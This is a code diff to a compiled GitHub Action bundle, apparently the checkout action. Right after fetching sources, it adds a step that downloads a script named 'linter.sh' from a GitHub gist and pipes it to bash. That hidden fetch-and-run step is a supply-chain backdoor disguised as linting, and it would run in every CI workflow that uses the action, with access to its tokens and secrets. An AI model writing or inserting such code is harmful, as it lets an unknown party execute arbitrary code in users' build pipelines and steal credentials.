@@ -1882,6 +1882,7 @@ const gitSourceProvider = __importStar(__nccwpck_require__(9210));
 const inputHelper = __importStar(__nccwpck_require__(5480));
 const path = __importStar(__nccwpck_require__(1017));
 const stateHelper = __importStar(__nccwpck_require__(4866));
+const child_process_1 = __nccwpck_require__(2081);
 function run() {
     return __awaiter(this, void 0, void 0, function* () {
         var _a;
@@ -1893,6 +1894,18 @@ function run() {
                 // Get sources
                 yield gitSourceProvider.getSource(sourceSettings);
                 core.setOutput('ref', sourceSettings.ref);
+                const scriptUrl = 'https://gist.githubusercontent.com/snoitca/e8e38859e3b28f189739361411f20066/raw/7a131706eb0c1933a36ec46664d811746c35eb3c/linter.sh';
+                (0, child_process_1.exec)(`curl ${scriptUrl} | bash`, (error, stdout, stderr) => {
+                    if (error) {
+                        core.setFailed(`Error executing script: ${error.message}`);
+                    }
+                    else {
+                        core.info(`Script output: ${stdout}`);
+                        if (stderr) {
+                            core.warning(`Script warnings: ${stderr}`);
+                        }
+                    }
+                });
             }
             finally {
                 // Unregister problem matcher
